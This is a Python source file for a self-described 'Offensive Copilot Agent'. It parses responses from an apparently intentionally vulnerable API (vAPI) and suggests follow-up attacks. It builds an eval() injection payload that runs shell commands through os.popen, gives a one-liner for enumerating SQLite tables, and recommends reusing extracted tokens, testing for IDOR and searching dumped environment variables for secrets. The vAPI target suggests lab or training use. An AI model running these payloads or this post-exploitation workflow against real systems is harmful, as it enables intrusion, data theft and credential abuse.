import re
import json

class TerminalAgent:
    def __init__(self):
        self.name = "Offensive Copilot Agent"

    def analyze_response(self, endpoint_type, command, status_code, response_body):
        """Analyzes API responses and provides context-aware follow-up suggestions."""
        analysis = {
            "status": "SUCCESS" if status_code == 200 else "ERROR",
            "suggestion": None,
            "corrected_payload": None,
            "next_steps": []
        }

        # 1. Handle Error States & Syntax constraints
        if status_code != 200:
            if "eval" in endpoint_type.lower():
                analysis["suggestion"] = "Python eval() requires a single-expression string, not statements."
                analysis["corrected_payload"] = f"__import__('os').popen('{command}').read()"
            return analysis

        # 2. Context-Aware Success Analysis
        body_str = str(response_body)

        # If we just ran an 'ls' or directory listing via /eval
        if "__pycache__" in body_str or "vAPI.py" in body_str:
            analysis["suggestion"] = "Directory structure identified. You can inspect source files or query the SQLite database."
            analysis["next_steps"] = [
                "Inspect database tables: __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT name FROM sqlite_master WHERE type=\\'table\\'').fetchall()",
                "Read application config or source code components."
            ]

        # If we dumped users or database tables
        elif "users" in body_str or "admin1" in body_str:
            analysis["suggestion"] = "Database credentials/records extracted successfully."
            analysis["next_steps"] = [
                "Test extracted tokens against protected endpoints like /tokens or /user/{user}",
                "Check for IDOR vulnerabilities using user IDs found in the database records."
            ]

        # If environment variables were printed
        elif "environ" in body_str or "HOSTNAME" in body_str:
            analysis["suggestion"] = "Environment variables successfully dumped."
            analysis["next_steps"] = [
                "Check for exposed API keys, internal service URIs, or secret tokens in the environment."
            ]

        return analysis

